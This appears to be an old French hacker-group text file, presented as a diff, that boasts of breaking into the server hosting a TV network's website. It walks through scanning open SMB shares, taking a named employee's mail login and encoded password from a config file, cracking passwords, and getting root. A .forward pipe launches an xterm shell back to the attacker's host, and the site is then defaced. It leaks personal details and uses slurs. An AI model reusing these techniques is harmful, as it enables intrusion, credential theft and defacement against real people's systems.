@@ -1,0 +1,117 @@
+hello 
+vu kon n'arrte poa de me poze la meme question 
+"hey comment tu as  fait pour hakker www.fox.com ??"
+
+est comme j'en ais marre d'expliquer a tous le monde...
+je me suis dit ke j'allais faire un filez hin...
+
+bon on commence par le commencement
+
+www.fox.com est heberger par zentropy.com donc 
+
+j'ai fait un tit scan du domaine avec le fameux ADMhack :]
+
+ki ma dit gentillment ke il avait ca sur un pov WINNT.
+............
+ scan of 207.155.31.35
+ SAMBA!
+netbios name of 207.155.31.35 is RUBBLE
+
+        Sharename      Type      Comment
+        ---------      ----      -------
+        ACT            Disk
+        C              Disk
+        IPC$           IPC       Remote Inter Process Communication
+begin the scan...
+try to access \\RUBBLE\ACT ....
+We can access to ACT !!!
+try to access \\RUBBLE\C ....
+We can access to C !!!
+try to access \\RUBBLE\IPC$ ....
+We can access to IPC$ !!!
+.........;
+
+apres avoir fait un tit tour sur le 'C' de nore amie j'ai vue k'il 
+avait un __Eudora.ini___ vous savez le mailler.. :)
+alors je me suis dit comme se  mec doit avoir un account sur une machine
+pour avoir du mail je vais lui piquer son login/pass de mail car il avait
+de grande chance pour ke ca soit un account shell sur la machine de mail..
+
+voici un extrait du eudora.ini
+...
+LastOptionsCategory=0
+UserSignatures=1
+SavePasswordText=NjExNzE= <----- le voici le password encrypte
+AutoConnectionPassword=
+SaveDialupPasswordText=
+POPAccount=ryanm@bob.zentropy.com <---- hoho  voila son login hehe :)
+RealName=Ryan Magnussen
+ReturnAddress=ryanm@zentropy.com
+SMTPServer=bob.zentropy.com
+CheckForMailEvery=10
+..
+
+bon ensuite j'ai cracker sont mot de pass an EUDPASS un proggies sous DOS
+
+une fois ke j'ai u sont mot de pass je court allez le tester sur
+bob.zentropy.com
+
+
+bon je me connect en telnet ARGH c un account shell only :(
+je peux juste faire du ftp ...
+ARGH bon je me suis dis ke vais essayer de lui piker le /etc/passwd
+
+tin il etait shadow :( ... bon j'abandonne poa je fouille un peu dans la
+machine il avait un user "ajh" ki semblait etre le root de la machine 
+bon je vais fouiller un tit peu ca machine est la je tombe sur Crack
+vous savez le log de crackage de mot de passe :)) bhe figurer vous ke le
+gard avait fait un copie du fichier shadow dans son home dir mais readable
+par tous hehehe  bon je commence  a la cracker est par chance je tombe sur
+un vrai account shell on passe root peinard ...
+
+tin mais au moment de la compile de sniffit ce gros PD  nous a vue 
+est nous kill en plein vole tous nos connexion ..
+ok je reviendrais demain hehe..
+
+bon le lendemain tous content je retente le coup mais ARGH plus d'accout
+shell ;( tous des 
+
+sharonw:x:1045:1::/export/home/sharonw:/bin/false
+sallyb:x:1046:1::/export/home/sallyb:/bin/false
+barbarag:x:1047:1::/export/home/barbarag:/bin/false
+dorothyb:x:1048:1::/export/home/dorothyb:/bin/false
+
+tous avec un /bin/false mais tin se gros encule me surveille en plus du
+coup il as mis  un deny de tous *.hol.fr sur le telnet est le ftp ...
+
+bon du coup j'ai passer la nuit a le regarder est as essayer de me connex
+mais il me deconn aussi sec rha j'avais la haine :))
+
+(je reviendrais connard !%ù$ ke je me suis dit )
+(pis comme dirait mon pote B9 ..
+
+[`(~rewt@r11m101.cybercable.tm.fr)] ruse ruse ... un mek k'arrive a topper
+une heike fais de la FoX un Acces Anonymous en telnet :)
+
+hehe la raison la :)
+
+...
+
+WELL JE REVIENS LE LENDEMAIN AVEC LA GROSSE HAINE MOI !%*$
+
+bon se ke l'autre connard savais poa c ke il je pouvais recevoir des mail...
+donc.. utiliser le .forward hahahhah
+
+de se pas je putas un tit 
+
+"|xterm  -display  ip.de.gros.hacker:0 -e /sbin/sh" <-- heheh vui j'ai 
+un shell /bin/false par default mais la je m'execute un  VRAI SHELL HAHAHA :)))
+
+dans mon .forward
+ hop j'envoie une mail au mec est HOp je me recois un xterm sympa non . :)
+
+une fois le xterm je passe r00t 
+ pis je put la page web voila les gros !:)
+
+
+[The St00ned ADM Crew %^) ]
